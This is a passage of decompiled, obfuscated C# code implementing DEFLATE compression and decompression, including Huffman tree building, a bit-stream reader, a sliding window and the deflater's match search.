					}
					\u001d.\u0001(16);
					\u0017 = 5;
					goto case 5;
				}
				case 5:
				{
					int num3 = \u001e.\u0001(\u001d, \u001b);
					\u001b -= num3;
					if (\u001b == 0)
					{
						\u0017 = 2;
						return true;
					}
					return !\u001d.IsNeedingInput;
				}
				case 6:
					if (!\u001f.\u0001(\u001d))
					{
						return false;
					}
					\u007f = \u001f.\u0001();
					\u0080 = \u001f.\u0002();
					\u0017 = 7;
					goto case 7;
				case 7:
				case 8:
				case 9:
				case 10:
					return \u0001();
				case 12:
					return false;
				default:
					return false;
				}
			}

			public int \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				int num = 0;
				do
				{
					if (\u0017 != 11)
					{
						int num2 = \u001e.\u0001(\u0002, \u0003, \u0004);
						\u0003 += num2;
						num += num2;
						\u0004 -= num2;
						if (\u0004 == 0)
						{
							return num;
						}
					}
				}
				while (this.\u0002() || (\u001e.\u0002() > 0 && \u0017 != 11));
				return num;
			}
		}

		internal class \u0002
		{
			private byte[] m_\u0001;

			private int m_\u0002;

			private int \u0003;

			private uint \u0004;

			private int \u0005;

			public int AvailableBits => \u0005;

			public int AvailableBytes => \u0003 - this.m_\u0002 + (\u0005 >> 3);

			public bool IsNeedingInput => this.m_\u0002 == \u0003;

			public int \u0001(int \u0002)
			{
				if (\u0005 < \u0002)
				{
					if (this.m_\u0002 == \u0003)
					{
						return -1;
					}
					\u0004 |= (uint)(((this.m_\u0001[this.m_\u0002++] & 0xFF) | ((this.m_\u0001[this.m_\u0002++] & 0xFF) << 8)) << \u0005);
					\u0005 += 16;
				}
				return (int)(\u0004 & ((1 << \u0002) - 1));
			}

			public void \u0001(int \u0002)
			{
				\u0004 >>= \u0002;
				\u0005 -= \u0002;
			}

			public void \u0001()
			{
				\u0004 >>= \u0005 & 7;
				\u0005 &= -8;
			}

			public int \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				int num = 0;
				while (\u0005 > 0 && \u0004 > 0)
				{
					\u0002[\u0003++] = (byte)this.\u0004;
					this.\u0004 >>= 8;
					\u0005 -= 8;
					\u0004--;
					num++;
				}
				if (\u0004 == 0)
				{
					return num;
				}
				int num2 = this.\u0003 - this.m_\u0002;
				if (\u0004 > num2)
				{
					\u0004 = num2;
				}
				Array.Copy(this.m_\u0001, this.m_\u0002, \u0002, \u0003, \u0004);
				this.m_\u0002 += \u0004;
				if (((this.m_\u0002 - this.\u0003) & 1) != 0)
				{
					this.\u0004 = (uint)(this.m_\u0001[this.m_\u0002++] & 0xFF);
					\u0005 = 8;
				}
				return num + \u0004;
			}

			public void \u0002()
			{
				\u0004 = (uint)(this.m_\u0002 = (\u0003 = (\u0005 = 0)));
			}

			public void \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				if (this.m_\u0002 < this.\u0003)
				{
					throw new InvalidOperationException();
				}
				int num = \u0003 + \u0004;
				if (0 > \u0003 || \u0003 > num || num > \u0002.Length)
				{
					throw new ArgumentOutOfRangeException();
				}
				if ((\u0004 & 1) != 0)
				{
					this.\u0004 |= (uint)((\u0002[\u0003++] & 0xFF) << \u0005);
					\u0005 += 8;
				}
				this.m_\u0001 = \u0002;
				this.m_\u0002 = \u0003;
				this.\u0003 = num;
			}
		}

		internal class \u0003
		{
			private const int m_\u0001 = 32768;

			private const int m_\u0002 = 32767;

			private byte[] \u0003 = new byte[32768];

			private int \u0004;

			private int \u0005;

			public void \u0001(int \u0002)
			{
				if (\u0005++ == 32768)
				{
					throw new InvalidOperationException();
				}
				\u0003[\u0004++] = (byte)\u0002;
				\u0004 &= 32767;
			}

			private void \u0001(int \u0002, int \u0003, int \u0004)
			{
				while (\u0003-- > 0)
				{
					this.\u0003[this.\u0004++] = this.\u0003[\u0002++];
					this.\u0004 &= 32767;
					\u0002 &= 0x7FFF;
				}
			}

			public void \u0001(int \u0002, int \u0003)
			{
				if ((\u0005 += \u0002) > 32768)
				{
					throw new InvalidOperationException();
				}
				int num = (\u0004 - \u0003) & 0x7FFF;
				int num2 = 32768 - \u0002;
				if (num <= num2 && \u0004 < num2)
				{
					if (\u0002 <= \u0003)
					{
						Array.Copy(this.\u0003, num, this.\u0003, \u0004, \u0002);
						\u0004 += \u0002;
					}
					else
					{
						while (\u0002-- > 0)
						{
							this.\u0003[\u0004++] = this.\u0003[num++];
						}
					}
				}
				else
				{
					\u0001(num, \u0002, \u0003);
				}
			}

			public int \u0001(\u0002 \u0002, int \u0003)
			{
				\u0003 = Math.Min(Math.Min(\u0003, 32768 - \u0005), \u0002.AvailableBytes);
				int num = 32768 - \u0004;
				int num2;
				if (\u0003 > num)
				{
					num2 = \u0002.\u0001(this.\u0003, \u0004, num);
					if (num2 == num)
					{
						num2 += \u0002.\u0001(this.\u0003, 0, \u0003 - num);
					}
				}
				else
				{
					num2 = \u0002.\u0001(this.\u0003, \u0004, \u0003);
				}
				\u0004 = (\u0004 + num2) & 0x7FFF;
				\u0005 += num2;
				return num2;
			}

			public void \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				if (\u0005 > 0)
				{
					throw new InvalidOperationException();
				}
				if (\u0004 > 32768)
				{
					\u0003 += \u0004 - 32768;
					\u0004 = 32768;
				}
				Array.Copy(\u0002, \u0003, this.\u0003, 0, \u0004);
				this.\u0004 = \u0004 & 0x7FFF;
			}

			public int \u0001()
			{
				return 32768 - \u0005;
			}

			public int \u0002()
			{
				return \u0005;
			}

			public int \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				int num = this.\u0004;
				if (\u0004 > \u0005)
				{
					\u0004 = \u0005;
				}
				else
				{
					num = (this.\u0004 - \u0005 + \u0004) & 0x7FFF;
				}
				int num2 = \u0004;
				int num3 = \u0004 - num;
				if (num3 > 0)
				{
					Array.Copy(this.\u0003, 32768 - num3, \u0002, \u0003, num3);
					\u0003 += num3;
					\u0004 = num;
				}
				Array.Copy(this.\u0003, num - \u0004, \u0002, \u0003, \u0004);
				\u0005 -= num2;
				if (\u0005 < 0)
				{
					throw new InvalidOperationException();
				}
				return num2;
			}

			public void \u0001()
			{
				\u0005 = (\u0004 = 0);
			}
		}

		internal class \u0004
		{
			private const int m_\u0001 = 15;

			private short[] \u0002;

			public static readonly \u0004 \u0003;

			public static readonly \u0004 \u0004;

			static \u0004()
			{
				byte[] array = new byte[288];
				int num = 0;
				while (num < 144)
				{
					array[num++] = 8;
				}
				while (num < 256)
				{
					array[num++] = 9;
				}
				while (num < 280)
				{
					array[num++] = 7;
				}
				while (num < 288)
				{
					array[num++] = 8;
				}
				\u0003 = new \u0004(array);
				array = new byte[32];
				num = 0;
				while (num < 32)
				{
					array[num++] = 5;
				}
				\u0004 = new \u0004(array);
			}

			public \u0004(byte[] codeLengths)
			{
				\u0001(codeLengths);
			}

			private void \u0001(byte[] \u0002)
			{
				int[] array = new int[16];
				int[] array2 = new int[16];
				foreach (int num in \u0002)
				{
					if (num > 0)
					{
						array[num]++;
					}
				}
				int num2 = 0;
				int num3 = 512;
				for (int j = 1; j <= 15; j++)
				{
					array2[j] = num2;
					num2 += array[j] << 16 - j;
					if (j >= 10)
					{
						int num4 = array2[j] & 0x1FF80;
						int num5 = num2 & 0x1FF80;
						num3 += num5 - num4 >> 16 - j;
					}
				}
				this.\u0002 = new short[num3];
				int num6 = 512;
				for (int num7 = 15; num7 >= 10; num7--)
				{
					int num8 = num2 & 0x1FF80;
					num2 -= array[num7] << 16 - num7;
					int num9 = num2 & 0x1FF80;
					for (int k = num9; k < num8; k += 128)
					{
						this.\u0002[\u0007.\u0001(k)] = (short)((-num6 << 4) | num7);
						num6 += 1 << num7 - 9;
					}
				}
				for (int l = 0; l < \u0002.Length; l++)
				{
					int num10 = \u0002[l];
					if (num10 == 0)
					{
						continue;
					}
					num2 = array2[num10];
					int num11 = \u0007.\u0001(num2);
					if (num10 <= 9)
					{
						do
						{
							this.\u0002[num11] = (short)((l << 4) | num10);
							num11 += 1 << num10;
						}
						while (num11 < 512);
					}
					else
					{
						int num12 = this.\u0002[num11 & 0x1FF];
						int num13 = 1 << (num12 & 0xF);
						num12 = -(num12 >> 4);
						do
						{
							this.\u0002[num12 | (num11 >> 9)] = (short)((l << 4) | num10);
							num11 += 1 << num10;
						}
						while (num11 < num13);
					}
					array2[num10] = num2 + (1 << 16 - num10);
				}
			}

			public int \u0001(\u0002 \u0002)
			{
				int num;
				int num2;
				if ((num = \u0002.\u0001(9)) >= 0)
				{
					if ((num2 = this.\u0002[num]) >= 0)
					{
						\u0002.\u0001(num2 & 0xF);
						return num2 >> 4;
					}
					int num3 = -(num2 >> 4);
					int num4 = num2 & 0xF;
					if ((num = \u0002.\u0001(num4)) >= 0)
					{
						num2 = this.\u0002[num3 | (num >> 9)];
						\u0002.\u0001(num2 & 0xF);
						return num2 >> 4;
					}
					int num5 = \u0002.AvailableBits;
					num = \u0002.\u0001(num5);
					num2 = this.\u0002[num3 | (num >> 9)];
					if ((num2 & 0xF) <= num5)
					{
						\u0002.\u0001(num2 & 0xF);
						return num2 >> 4;
					}
					return -1;
				}
				int num6 = \u0002.AvailableBits;
				num = \u0002.\u0001(num6);
				num2 = this.\u0002[num];
				if (num2 >= 0 && (num2 & 0xF) <= num6)
				{
					\u0002.\u0001(num2 & 0xF);
					return num2 >> 4;
				}
				return -1;
			}
		}

		internal class \u0005
		{
			private const int m_\u0001 = 0;

			private const int m_\u0002 = 1;

			private const int \u0003 = 2;

			private const int \u0004 = 3;

			private const int \u0005 = 4;

			private const int \u0006 = 5;

			private static readonly int[] \u0007 = new int[3] { 3, 3, 11 };

			private static readonly int[] \u0008 = new int[3] { 2, 3, 7 };

			private byte[] \u000e;

			private byte[] \u000f;

			private \u0004 \u0010;

			private int \u0011;

			private int \u0012;

			private int \u0013;

			private int \u0014;

			private int \u0015;

			private int \u0016;

			private byte \u0017;

			private int \u0018;

			private static readonly int[] \u0019 = new int[19]
			{
				16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
				11, 4, 12, 3, 13, 2, 14, 1, 15
			};

			public bool \u0001(\u0002 \u0002)
			{
				while (true)
				{
					switch (\u0011)
					{
					default:
						continue;
					case 0:
						\u0012 = \u0002.\u0001(5);
						if (\u0012 < 0)
						{
							return false;
						}
						\u0012 += 257;
						\u0002.\u0001(5);
						\u0011 = 1;
						goto case 1;
					case 1:
						\u0013 = \u0002.\u0001(5);
						if (\u0013 < 0)
						{
							return false;
						}
						\u0013++;
						\u0002.\u0001(5);
						\u0015 = \u0012 + \u0013;
						\u000f = new byte[\u0015];
						\u0011 = 2;
						goto case 2;
					case 2:
						\u0014 = \u0002.\u0001(4);
						if (\u0014 < 0)
						{
							return false;
						}
						\u0014 += 4;
						\u0002.\u0001(4);
						\u000e = new byte[19];
						\u0018 = 0;
						\u0011 = 3;
						goto case 3;
					case 3:
						while (\u0018 < \u0014)
						{
							int num2 = \u0002.\u0001(3);
							if (num2 < 0)
							{
								return false;
							}
							\u0002.\u0001(3);
							\u000e[\u0019[\u0018]] = (byte)num2;
							\u0018++;
						}
						\u0010 = new \u0004(\u000e);
						\u000e = null;
						\u0018 = 0;
						\u0011 = 4;
						goto case 4;
					case 4:
					{
						int num;
						while (((num = \u0010.\u0001(\u0002)) & -16) == 0)
						{
							\u000f[\u0018++] = (\u0017 = (byte)num);
							if (\u0018 == \u0015)
							{
								return true;
							}
						}
						if (num < 0)
						{
							return false;
						}
						if (num >= 17)
						{
							\u0017 = 0;
						}
						\u0016 = num - 16;
						\u0011 = 5;
						break;
					}
					case 5:
						break;
					}
					int num3 = \u0008[\u0016];
					int num4 = \u0002.\u0001(num3);
					if (num4 < 0)
					{
						return false;
					}
					\u0002.\u0001(num3);
					num4 += \u0007[\u0016];
					while (num4-- > 0)
					{
						\u000f[\u0018++] = \u0017;
					}
					if (\u0018 == \u0015)
					{
						break;
					}
					\u0011 = 4;
				}
				return true;
			}

			public \u0004 \u0001()
			{
				byte[] array = new byte[\u0012];
				Array.Copy(\u000f, 0, array, 0, \u0012);
				return new \u0004(array);
			}

			public \u0004 \u0002()
			{
				byte[] array = new byte[\u0013];
				Array.Copy(\u000f, \u0012, array, 0, \u0013);
				return new \u0004(array);
			}
		}

		internal class \u0006
		{
			private const int m_\u0001 = 4;

			private const int \u0002 = 8;

			private const int \u0003 = 16;

			private const int \u0004 = 20;

			private const int \u0005 = 28;

			private const int m_\u0006 = 30;

			private int \u0007 = 16;

			private long \u0008;

			private \u000e \u000e;

			private \u0008 \u000f;

			public long TotalOut => \u0008;

			public bool IsFinished
			{
				get
				{
					if (\u0007 == 30)
					{
						return \u000e.IsFlushed;
					}
					return false;
				}
			}

			public bool IsNeedingInput => \u000f.\u0001();

			public \u0006()
			{
				\u000e = new \u000e();
				\u000f = new \u0008(\u000e);
			}

			public void \u0001()
			{
				\u0007 |= 12;
			}

			public void \u0001(byte[] \u0002)
			{
				\u000f.\u0001(\u0002);
			}

			public int \u0001(byte[] \u0002)
			{
				int num = 0;
				int num2 = \u0002.Length;
				int num3 = num2;
				while (true)
				{
					int num4 = \u000e.\u0001(\u0002, num, num2);
					num += num4;
					\u0008 += num4;
					num2 -= num4;
					if (num2 == 0 || \u0007 == 30)
					{
						break;
					}
					if (\u000f.\u0002((\u0007 & 4) != 0, (\u0007 & 8) != 0))
					{
						continue;
					}
					if (\u0007 == 16)
					{
						return num3 - num2;
					}
					if (\u0007 == 20)
					{
						for (int num5 = 8 + (-\u000e.BitCount & 7); num5 > 0; num5 -= 10)
						{
							\u000e.\u0001(2, 10);
						}
						\u0007 = 16;
					}
					else if (\u0007 == 28)
					{
						\u000e.\u0001();
						\u0007 = 30;
					}
				}
				return num3 - num2;
			}
		}

		internal class \u0007
		{
			public class \u0001
			{
				public short[] \u0001;

				public byte[] \u0002;

				public int \u0003;

				public int \u0004;

				private short[] \u0005;

				private int[] \u0006;

				private int \u0007;

				private \u0007 \u0008;

				public \u0001(\u0007 dh, int elems, int minCodes, int maxLength)
				{
					\u0008 = dh;
					\u0003 = minCodes;
					\u0007 = maxLength;
					this.\u0001 = new short[elems];
					\u0006 = new int[maxLength];
				}

				public void \u0001(int \u0002)
				{
					\u0008.\u0010.\u0001(\u0005[\u0002] & 0xFFFF, this.\u0002[\u0002]);
				}

				public void \u0001(short[] \u0002, byte[] \u0003)
				{
					\u0005 = \u0002;
					this.\u0002 = \u0003;
				}

				public void \u0001()
				{
					int[] array = new int[\u0007];
					int num = 0;
					\u0005 = new short[this.\u0001.Length];
					for (int i = 0; i < \u0007; i++)
					{
						array[i] = num;
						num += \u0006[i] << 15 - i;
					}
					for (int j = 0; j < \u0004; j++)
					{
						int num2 = this.\u0002[j];
						if (num2 > 0)
						{
							\u0005[j] = global::\u0006.\u0004.\u0007.\u0001(array[num2 - 1]);
							array[num2 - 1] += 1 << 16 - num2;
						}
					}
				}

				private void \u0001(int[] \u0002)
				{
					this.\u0002 = new byte[this.\u0001.Length];
					int num = \u0002.Length / 2;
					int num2 = (num + 1) / 2;
					int num3 = 0;
					for (int i = 0; i < \u0007; i++)
					{
						\u0006[i] = 0;
					}
					int[] array = new int[num];
					array[num - 1] = 0;
					for (int num4 = num - 1; num4 >= 0; num4--)
					{
						if (\u0002[2 * num4 + 1] != -1)
						{
							int num5 = array[num4] + 1;
							if (num5 > \u0007)
							{
								num5 = \u0007;
								num3++;
							}
							array[\u0002[2 * num4]] = (array[\u0002[2 * num4 + 1]] = num5);
						}
						else
						{
							int num6 = array[num4];
							\u0006[num6 - 1]++;
							this.\u0002[\u0002[2 * num4]] = (byte)array[num4];
						}
					}
					if (num3 == 0)
					{
						return;
					}
					int num7 = \u0007 - 1;
					while (true)
					{
						if (\u0006[--num7] != 0)
						{
							do
							{
								\u0006[num7]--;
								\u0006[++num7]++;
								num3 -= 1 << \u0007 - 1 - num7;
							}
							while (num3 > 0 && num7 < \u0007 - 1);
							if (num3 <= 0)
							{
								break;
							}
						}
					}
					\u0006[\u0007 - 1] += num3;
					\u0006[\u0007 - 2] -= num3;
					int num8 = 2 * num2;
					for (int num9 = \u0007; num9 != 0; num9--)
					{
						int num10 = \u0006[num9 - 1];
						while (num10 > 0)
						{
							int num11 = 2 * \u0002[num8++];
							if (\u0002[num11 + 1] == -1)
							{
								this.\u0002[\u0002[num11]] = (byte)num9;
								num10--;
							}
						}
					}
				}

				public void \u0002()
				{
					int num = this.\u0001.Length;
					int[] array = new int[num];
					int num2 = 0;
					int num3 = 0;
					for (int i = 0; i < num; i++)
					{
						int num4 = this.\u0001[i];
						if (num4 != 0)
						{
							int num5 = num2++;
							int num6;
							while (num5 > 0 && this.\u0001[array[num6 = (num5 - 1) / 2]] > num4)
							{
								array[num5] = array[num6];
								num5 = num6;
							}
							array[num5] = i;
							num3 = i;
						}
					}
					while (num2 < 2)
					{
						int num7 = ((num3 < 2) ? (++num3) : 0);
						array[num2++] = num7;
					}
					\u0004 = Math.Max(num3 + 1, \u0003);
					int num8 = num2;
					int[] array2 = new int[4 * num2 - 2];
					int[] array3 = new int[2 * num2 - 1];
					int num9 = num8;
					for (int j = 0; j < num2; j++)
					{
						int num10 = (array2[2 * j] = array[j]);
						array2[2 * j + 1] = -1;
						array3[j] = this.\u0001[num10] << 8;
						array[j] = j;
					}
					do
					{
						int num11 = array[0];
						int num12 = array[--num2];
						int num13 = 0;
						int num14;
						for (num14 = 1; num14 < num2; num14 = num14 * 2 + 1)
						{
							if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
							{
								num14++;
							}
							array[num13] = array[num14];
							num13 = num14;
						}
						int num15 = array3[num12];
						while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
						{
							array[num14] = array[num13];
						}
						array[num14] = num12;
						int num16 = array[0];
						num12 = num9++;
						array2[2 * num12] = num11;
						array2[2 * num12 + 1] = num16;
						int num17 = Math.Min(array3[num11] & 0xFF, array3[num16] & 0xFF);
						num15 = (array3[num12] = array3[num11] + array3[num16] - num17 + 1);
						num13 = 0;
						for (num14 = 1; num14 < num2; num14 = num13 * 2 + 1)
						{
							if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
							{
								num14++;
							}
							array[num13] = array[num14];
							num13 = num14;
						}
						while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
						{
							array[num14] = array[num13];
						}
						array[num14] = num12;
					}
					while (num2 > 1);
					\u0001(array2);
				}

				public int \u0001()
				{
					int num = 0;
					for (int i = 0; i < this.\u0001.Length; i++)
					{
						num += this.\u0001[i] * this.\u0002[i];
					}
					return num;
				}

				public void \u0001(\u0001 \u0002)
				{
					int num = -1;
					int num2 = 0;
					while (num2 < \u0004)
					{
						int num3 = 1;
						int num4 = this.\u0002[num2];
						int num5;
						int num6;
						if (num4 == 0)
						{
							num5 = 138;
							num6 = 3;
						}
						else
						{
							num5 = 6;
							num6 = 3;
							if (num != num4)
							{
								\u0002.\u0001[num4]++;
								num3 = 0;
							}
						}
						num = num4;
						num2++;
						while (num2 < \u0004 && num == this.\u0002[num2])
						{
							num2++;
							if (++num3 >= num5)
							{
								break;
							}
						}
						if (num3 < num6)
						{
							\u0002.\u0001[num] += (short)num3;
						}
						else if (num != 0)
						{
							\u0002.\u0001[16]++;
						}
						else if (num3 <= 10)
						{
							\u0002.\u0001[17]++;
						}
						else
						{
							\u0002.\u0001[18]++;
						}
					}
				}

				public void \u0002(\u0001 \u0002)
				{
					int num = -1;
					int num2 = 0;
					while (num2 < \u0004)
					{
						int num3 = 1;
						int num4 = this.\u0002[num2];
						int num5;
						int num6;
						if (num4 == 0)
						{
							num5 = 138;
							num6 = 3;
						}
						else
						{
							num5 = 6;
							num6 = 3;
							if (num != num4)
							{
								\u0002.\u0001(num4);
								num3 = 0;
							}
						}
						num = num4;
						num2++;
						while (num2 < \u0004 && num == this.\u0002[num2])
						{
							num2++;
							if (++num3 >= num5)
							{
								break;
							}
						}
						if (num3 < num6)
						{
							while (num3-- > 0)
							{
								\u0002.\u0001(num);
							}
						}
						else if (num != 0)
						{
							\u0002.\u0001(16);
							\u0008.\u0010.\u0001(num3 - 3, 2);
						}
						else if (num3 <= 10)
						{
							\u0002.\u0001(17);
							\u0008.\u0010.\u0001(num3 - 3, 3);
						}
						else
						{
							\u0002.\u0001(18);
							\u0008.\u0010.\u0001(num3 - 11, 7);
						}
					}
				}
			}

			private const int m_\u0001 = 16384;

			private const int m_\u0002 = 286;

			private const int \u0003 = 30;

			private const int \u0004 = 19;

			private const int \u0005 = 16;

			private const int \u0006 = 17;

			private const int m_\u0007 = 18;

			private const int \u0008 = 256;

			private static readonly int[] \u000e;

			private static readonly byte[] \u000f;

			private \u000e \u0010;

			private \u0001 \u0011;

			private \u0001 \u0012;

			private \u0001 \u0013;

			private short[] \u0014;

			private byte[] \u0015;

			private int \u0016;

			private int \u0017;

			private static readonly short[] \u0018;

			private static readonly byte[] \u0019;

			private static readonly short[] \u001a;

			private static readonly byte[] \u001b;

			public static short \u0001(int \u0002)
			{
				return (short)((\u000f[\u0002 & 0xF] << 12) | (\u000f[(\u0002 >> 4) & 0xF] << 8) | (\u000f[(\u0002 >> 8) & 0xF] << 4) | \u000f[\u0002 >> 12]);
			}

			static \u0007()
			{
				\u000e = new int[19]
				{
					16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
					11, 4, 12, 3, 13, 2, 14, 1, 15
				};
				\u000f = new byte[16]
				{
					0, 8, 4, 12, 2, 10, 6, 14, 1, 9,
					5, 13, 3, 11, 7, 15
				};
				\u0018 = new short[286];
				\u0019 = new byte[286];
				int num = 0;
				while (num < 144)
				{
					\u0018[num] = global::\u0006.\u0004.\u0007.\u0001(48 + num << 8);
					\u0019[num++] = 8;
				}
				while (num < 256)
				{
					\u0018[num] = global::\u0006.\u0004.\u0007.\u0001(256 + num << 7);
					\u0019[num++] = 9;
				}
				while (num < 280)
				{
					\u0018[num] = global::\u0006.\u0004.\u0007.\u0001(-256 + num << 9);
					\u0019[num++] = 7;
				}
				while (num < 286)
				{
					\u0018[num] = global::\u0006.\u0004.\u0007.\u0001(-88 + num << 8);
					\u0019[num++] = 8;
				}
				\u001a = new short[30];
				\u001b = new byte[30];
				for (num = 0; num < 30; num++)
				{
					\u001a[num] = global::\u0006.\u0004.\u0007.\u0001(num << 11);
					\u001b[num] = 5;
				}
			}

			public \u0007(\u000e pending)
			{
				\u0010 = pending;
				\u0011 = new \u0001(this, 286, 257, 15);
				\u0012 = new \u0001(this, 30, 1, 15);
				\u0013 = new \u0001(this, 19, 4, 7);
				\u0014 = new short[16384];
				\u0015 = new byte[16384];
			}

			public void \u0001()
			{
				\u0016 = 0;
				\u0017 = 0;
			}

			private int \u0001(int \u0002)
			{
				if (\u0002 == 255)
				{
					return 285;
				}
				int num = 257;
				while (\u0002 >= 8)
				{
					num += 4;
					\u0002 >>= 1;
				}
				return num + \u0002;
			}

			private int \u0002(int \u0002)
			{
				int num = 0;
				while (\u0002 >= 4)
				{
					num += 2;
					\u0002 >>= 1;
				}
				return num + \u0002;
			}

			public void \u0001(int \u0002)
			{
				\u0013.\u0001();
				\u0011.\u0001();
				\u0012.\u0001();
				\u0010.\u0001(\u0011.\u0004 - 257, 5);
				\u0010.\u0001(\u0012.\u0004 - 1, 5);
				\u0010.\u0001(\u0002 - 4, 4);
				for (int i = 0; i < \u0002; i++)
				{
					\u0010.\u0001(\u0013.\u0002[\u000e[i]], 3);
				}
				\u0011.\u0002(\u0013);
				\u0012.\u0002(\u0013);
			}

			public void \u0002()
			{
				for (int i = 0; i < \u0016; i++)
				{
					int num = \u0015[i] & 0xFF;
					int num2 = \u0014[i];
					if (num2-- != 0)
					{
						int num3 = \u0001(num);
						\u0011.\u0001(num3);
						int num4 = (num3 - 261) / 4;
						if (num4 > 0 && num4 <= 5)
						{
							\u0010.\u0001(num & ((1 << num4) - 1), num4);
						}
						int num5 = \u0002(num2);
						\u0012.\u0001(num5);
						num4 = num5 / 2 - 1;
						if (num4 > 0)
						{
							\u0010.\u0001(num2 & ((1 << num4) - 1), num4);
						}
					}
					else
					{
						\u0011.\u0001(num);
					}
				}
				\u0011.\u0001(256);
			}

			public void \u0001(byte[] \u0002, int \u0003, int \u0004, bool \u0005)
			{
				\u0010.\u0001(\u0005 ? 1 : 0, 3);
				\u0010.\u0001();
				\u0010.\u0001(\u0004);
				\u0010.\u0001(~\u0004);
				\u0010.\u0001(\u0002, \u0003, \u0004);
				this.\u0001();
			}

			public void \u0002(byte[] \u0002, int \u0003, int \u0004, bool \u0005)
			{
				\u0011.\u0001[256]++;
				\u0011.\u0002();
				\u0012.\u0002();
				\u0011.\u0001(\u0013);
				\u0012.\u0001(\u0013);
				\u0013.\u0002();
				int num = 4;
				for (int num2 = 18; num2 > num; num2--)
				{
					if (\u0013.\u0002[\u000e[num2]] > 0)
					{
						num = num2 + 1;
					}
				}
				int num3 = 14 + num * 3 + \u0013.\u0001() + \u0011.\u0001() + \u0012.\u0001() + \u0017;
				int num4 = \u0017;
				for (int i = 0; i < 286; i++)
				{
					num4 += \u0011.\u0001[i] * \u0019[i];
				}
				for (int j = 0; j < 30; j++)
				{
					num4 += \u0012.\u0001[j] * \u001b[j];
				}
				if (num3 >= num4)
				{
					num3 = num4;
				}
				if (\u0003 >= 0 && \u0004 + 4 < num3 >> 3)
				{
					\u0001(\u0002, \u0003, \u0004, \u0005);
				}
				else if (num3 == num4)
				{
					\u0010.\u0001(2 + (\u0005 ? 1 : 0), 3);
					\u0011.\u0001(\u0018, \u0019);
					\u0012.\u0001(\u001a, \u001b);
					this.\u0002();
					this.\u0001();
				}
				else
				{
					\u0010.\u0001(4 + (\u0005 ? 1 : 0), 3);
					this.\u0001(num);
					this.\u0002();
					this.\u0001();
				}
			}

			public bool \u0001()
			{
				return \u0016 >= 16384;
			}

			public bool \u0001(int \u0002)
			{
				\u0014[\u0016] = 0;
				\u0015[\u0016++] = (byte)\u0002;
				\u0011.\u0001[\u0002]++;
				return this.\u0001();
			}

			public bool \u0001(int \u0002, int \u0003)
			{
				\u0014[\u0016] = (short)\u0002;
				\u0015[\u0016++] = (byte)(\u0003 - 3);
				int num = \u0001(\u0003 - 3);
				\u0011.\u0001[num]++;
				if (num >= 265 && num < 285)
				{
					\u0017 += (num - 261) / 4;
				}
				int num2 = this.\u0002(\u0002 - 1);
				\u0012.\u0001[num2]++;
				if (num2 >= 4)
				{
					\u0017 += num2 / 2 - 1;
				}
				return this.\u0001();
			}
		}

		internal class \u0008
		{
			private const int m_\u0001 = 258;

			private const int m_\u0002 = 3;

			private const int m_\u0003 = 32768;

			private const int \u0004 = 32767;

			private const int \u0005 = 32768;

			private const int \u0006 = 32767;

			private const int \u0007 = 5;

			private const int m_\u0008 = 262;

			private const int \u000e = 32506;

			private const int \u000f = 4096;

			private int \u0010;

			private short[] \u0011;

			private short[] \u0012;

			private int \u0013;

			private int \u0014;

			private bool \u0015;

			private int \u0016;

			private int \u0017;

			private int \u0018;

			private byte[] \u0019;

			private byte[] \u001a;

			private int \u001b;

			private int \u001c;

			private int \u001d;

			private \u000e \u001e;

			private \u0007 \u001f;

			public \u0008(\u000e pending)
			{
				\u001e = pending;
				\u001f = new \u0007(pending);
				\u0019 = new byte[65536];
				\u0011 = new short[32768];
				\u0012 = new short[32768];
				\u0016 = (\u0017 = 1);
			}

			private void \u0001()
			{
				\u0010 = (\u0019[\u0017] << 5) ^ \u0019[\u0017 + 1];
			}

			private int \u0001()
			{
				int num = ((\u0010 << 5) ^ \u0019[\u0017 + 2]) & 0x7FFF;
				short num2 = (\u0012[\u0017 & 0x7FFF] = \u0011[num]);
				\u0011[num] = (short)\u0017;
				\u0010 = num;
				return num2 & 0xFFFF;
			}

			private void \u0002()
			{
				Array.Copy(\u0019, 32768, \u0019, 0, 32768);
				\u0013 -= 32768;
				\u0017 -= 32768;
				\u0016 -= 32768;
				for (int i = 0; i < 32768; i++)
				{
					int num = \u0011[i] & 0xFFFF;
					\u0011[i] = (short)((num >= 32768) ? (num - 32768) : 0);
				}
				for (int j = 0; j < 32768; j++)
				{
					int num2 = \u0012[j] & 0xFFFF;
					\u0012[j] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
				}
			}

			public void \u0003()
			{
				if (\u0017 >= 65274)
				{
					\u0002();
				}
				while (\u0018 < 262 && \u001c < \u001d)
				{
					int num = 65536 - \u0018 - \u0017;
					if (num > \u001d - \u001c)
					{
						num = \u001d - \u001c;
					}
					Array.Copy(\u001a, \u001c, \u0019, \u0017 + \u0018, num);
					\u001c += num;
					\u001b += num;
					\u0018 += num;
				}
				if (\u0018 >= 3)
				{
					\u0001();
				}
			}

			private bool \u0001(int \u0002)
			{
				int num = 128;
				int num2 = 128;
				short[] array = \u0012;
				int num3 = \u0017;
				int num4 = \u0017 + \u0014;
				int num5 = Math.Max(\u0014, 2);
				int num6 = Math.Max(\u0017 - 32506, 0);
				int num7 = \u0017 + 258 - 1;
				byte b = \u0019[num4 - 1];
				byte b2 = \u0019[num4];
				if (num5 >= 8)
				{
					num >>= 2;
				}
				if (num2 > \u0018)
				{
					num2 = \u0018;
				}
				do
				{
					if (\u0019[\u0002 + num5] != b2 || \u0019[\u0002 + num5 - 1] != b || \u0019[\u0002] != \u0019[num3] || \u0019[\u0002 + 1] != \u0019[num3 + 1])
					{
						continue;
					}
					int num8 = \u0002 + 2;
					num3 += 2;
					while (\u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && \u0019[++num3] == \u0019[++num8] && num3 < num7)
					{
					}
					if (num3 > num4)
					{
